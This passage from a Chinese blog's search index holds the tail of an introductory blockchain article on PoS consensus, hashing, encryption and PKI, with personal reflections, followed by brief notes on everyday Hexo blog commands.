id="📕工作原理："><a href="#📕工作原理：" class="headerlink" title="📕工作原理："></a>📕<em><strong>工作原理：</strong></em></h5><p>PoW是通过计算工作量来获得记账权，而在PoS中即转变为资本证明，它根据每个节点所拥有代币数量的比例和持币时间来通过<strong>算法按等比例地降低节点的挖矿难度</strong>，<strong>从而提高了寻找满足难度随机数的效率，缩短达成共识所需的时间</strong>，因此拥有的币的时间越久和数量越多，它获得的记账的概率就越大。类似于企业的股东制，占有股份多的，它拥有的决策权就越重。</p><p>PoS仍然需要网络中的节点进行PoW挖矿运算，因此，PoS机制并没有从根本上解决PoW机制难以应用于商业领域的问题。</p><p>📕<em><strong>公式表达：</strong></em><br>$$<br>SHA256 ( Nonce + blockheader ） &lt; 目标值的难度系数&#x2F;综合（拥有代币数量的比例和持币时间）<br>$$</p><p>[部分内容取自]: <a href="https://blog.csdn.net/to_cm/article/details/82765861">https://blog.csdn.net/to_cm/article/details/82765861</a>“区块链共识机制”<br>[部分内容取自]: <a href="https://blog.csdn.net/to_cm/article/details/82828144">https://blog.csdn.net/to_cm/article/details/82828144</a>“深入理解PoW共识”</p><p>📕<em><strong>优点</strong>：</em></p><ol><li>大幅缩减了参与验证和记账的数量；</li><li>提高交易吞吐量；</li><li>减少交易验证达成共识时间。</li></ol><p>📕<em><strong>缺点</strong>：</em></p><ol><li>记账权被掌握在少数被指定的节点上。</li><li>参与度不够高，缺乏一定的代表性，显失公平。</li></ol><h3 id="💎密码学——区块链构筑的底层（概览）"><a href="#💎密码学——区块链构筑的底层（概览）" class="headerlink" title="💎密码学——区块链构筑的底层（概览）"></a>💎密码学——区块链构筑的底层（概览）</h3><h4 id="A-Hash算法"><a href="#A-Hash算法" class="headerlink" title="A.Hash算法"></a>A.Hash算法</h4><p>能任意长度的二进制值映射为较短的固定长度的二进制值（Hash值），并且不同的明文很难映射为相同的Hash值。</p><p>主要有<a href="https://en.wikipedia.org/wiki/MD5">MD5</a>和<a href="https://en.wikipedia.org/wiki/SHA-2">SHA256</a>。其主要特点是<strong>正向快速，逆向困难，输入敏感，冲突避免，</strong>这些特性能够在区块链网络中发挥巨大的价值。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/16.webp" alt="16"></p><h4 id="B-对称和非对称加密"><a href="#B-对称和非对称加密" class="headerlink" title="B.对称和非对称加密"></a>B.对称和非对称加密</h4><p>对称加密：就是采用这种加密方法的双方使用方式用<strong>同样的密钥进行加密和解密</strong>。主要算法有<u>DES、AES、Blowfish、IDEA、RC5、RC6</u>等。</p><p>非对称加密：指加密和解密使用<strong>不同密钥的加密算法</strong>，也称为公私钥加密。主要算法有<a href="https://baike.baidu.com/item/RSA">RSA</a>、<a href="https://baike.baidu.com/item/Elgamal">Elgamal</a>、背包算法、Rabin、D-H、<a href="https://baike.baidu.com/item/ECC">ECC</a><strong>（椭圆曲线加密算法）</strong>。</p><h4 id="C-PKI体系"><a href="#C-PKI体系" class="headerlink" title="C.PKI体系"></a>C.PKI体系</h4><p><a href="https://baike.baidu.com/item/%E5%85%AC%E9%92%A5%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/10881894?fromtitle=PKI&fromid=212376&fr=aladdin">PKI</a>是公钥基础设施，我们利用此在不安全的网络中构建了安全服务，从而让互不相识的人们可以安全的通信。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE%5Ctrue%5C17.jpeg" alt="17"></p><h2 id="5-辩证思维看待区块链，为什么要去学区块链技术？"><a href="#5-辩证思维看待区块链，为什么要去学区块链技术？" class="headerlink" title="5. 辩证思维看待区块链，为什么要去学区块链技术？"></a>5. 辩证思维看待区块链，为什么要去学区块链技术？</h2><blockquote><p>个人理解与看法，将持续更新</p></blockquote><p>​        每一次革新技术的诞生，都代表着这个世界需要做出一些改变——区块链的诞生，是一代年轻人对于这个时代的反抗与革命。电影《让子弹飞》中张麻子上任鹅城的那句话我记忆犹深<u><strong>“公平，公平，还tm的是公平！”</strong></u>。是的，越来越多的年轻人经历不公平，越来越多的年轻人开始追求公平，反思不公平的缘由。这世界上绝大部分财富都掌握在前百分之一的富人手中，而留给新一代年轻人的机会越来越少，可能性也越来越小。在不断自我审问的过程中，可以发现，<u>追求公平绝不仅仅去依靠双手劳动，更需要靠智慧和选择</u>。我很认同这样一句话：“苦难从来不值得被歌颂，如果不是迫不得已，谁会愿意遭受苦难？”是的，在【跨时代总结】中我提到，苦难是和机遇并存的，因此学习和思考，永无止境。</p><h3 id="💎怎能无动于衷？"><a href="#💎怎能无动于衷？" class="headerlink" title="💎怎能无动于衷？"></a>💎怎能无动于衷？</h3><p>​         区块链，毫无疑问将成为未来的趋势，并且这门技术的应用性，完完全全的符合【社会主义核心价值观】。<strong>2022，正是区块链的元年。</strong>正如十来年前的互联网革命一般，那时候学习java，了解java的人并不多，但正是这一波人，窥见了时代趋势，抓住了互联网的巨浪，扬帆起航。而区块链，正隐藏着如此无限的可能性，前瞻时代的浪潮，做好沉淀和学习的提前准备，当巨浪来临，方能<u><strong>直挂云帆济沧海</strong>！</u></p><h3 id="💎不是人人都能成为V神"><a href="#💎不是人人都能成为V神" class="headerlink" title="💎不是人人都能成为V神"></a>💎不是人人都能成为V神</h3><p>​        写在最后，也是希望大家能够保持<u>理性思考和时常自省</u>的能力。人人都想成为V神，但他的成功是在天时地利人和的条件下，百年才一遇的个例。妄想平步青云，对于普通人来说未免有些难。区块链技术仍处在初期阶段，发展还不够成熟，道路上还存在着很多阻力。可以看到，以区块链技术为基础的币圈不乏投资失败的普通人，而一夜暴富也仅是个例，究其原因，是他们陷入了富人精心布局的游戏之中，<u><strong>因为比技术更加复杂的，是人心</strong></u>。但在这个圈子里，技术高于一切，智能合约的出现，象征着<strong>代码即法律</strong>的不可篡改。而掌握技术，就是在未来掌握着财富！<u>“<strong>路漫漫其修远兮，吾将上下而求索</strong>”</u>，持久学习和思考，不仅仅是为了未来拥有更多的自由，也为了公正的天秤不再倾斜。</p><h2 id="🚀一些必要的名词解释"><a href="#🚀一些必要的名词解释" class="headerlink" title="🚀一些必要的名词解释"></a>🚀一些必要的名词解释</h2><p>[^DeFi]: 即“去中心化金融<em>（Decentralized Finance）</em>”，也被称为“开放式金融” 。是以<a href="https://baike.baidu.com/item/%E6%AF%94%E7%89%B9%E5%B8%81/4143690">比特币</a>和<a href="https://baike.baidu.com/item/%E4%BB%A5%E5%A4%AA%E5%B8%81/20857686">以太币</a>为代表的<a href="https://baike.baidu.com/item/%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81/22415288">加密货币</a>，<a href="https://baike.baidu.com/item/%E5%8C%BA%E5%9D%97%E9%93%BE/13465666">区块链</a>和<a href="https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/19770937">智能合约</a>结合的产物</p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>区块链入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo操作简记</title>
    <link href="/2022/08/30/Hexo%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0/"/>
    <url>/2022/08/30/Hexo%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><h3 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><h3 id="部署至Github"><a href="#部署至Github" class="headerlink" title="部署至Github"></a>部署至Github</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><h3 id="创建新页面"><a href="#创建新页面" class="headerlink" title="创建新页面"></a>创建新页面</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new page <span class="hljs-string">&quot;about&quot;</span><br></code></pre></td></tr></table></figure><p>创建成功后，编辑博客目录下 <code>/source/about/index.md</code>，添加 <code>layout</code> 属性。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">---<br>title: about<br><span class="hljs-section">layout: about</span><br><span class="hljs-section">---</span><br></code></pre></td></tr></table></figure><h3 id="博客图片显示问题"><a href="#博客图片显示问题" class="headerlink" title="博客图片显示问题"></a>博客图片显示问题</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">修改 _config.yml 文件中 post_asset_folder:<span class="hljs-literal">true</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装插件</span><br>npm install hexo-asset-image -- save<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">生成新文章时会自动生成存放图片的同名文件夹</span><br>hexo n &quot;xxxx&quot;<br></code></pre></td></tr></table></figure><h3 id="清除添加文件（平时严禁清理）"><a href="#清除添加文件（平时严禁清理）" class="headerlink" title="清除添加文件（平时严禁清理）"></a>清除添加文件（平时严禁清理）</h3><blockquote><p>Cleans the cache file (<code>db.json</code>) and generated files (<code>public</code>).</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br></code></pre></td></tr></table></figure><h3 id="自定义主题样式"><a href="#自定义主题样式" class="headerlink" title="自定义主题样式"></a>自定义主题样式</h3>]]></content>
    
    
    <categories>
      
      <category>基操勿6</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo基操</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
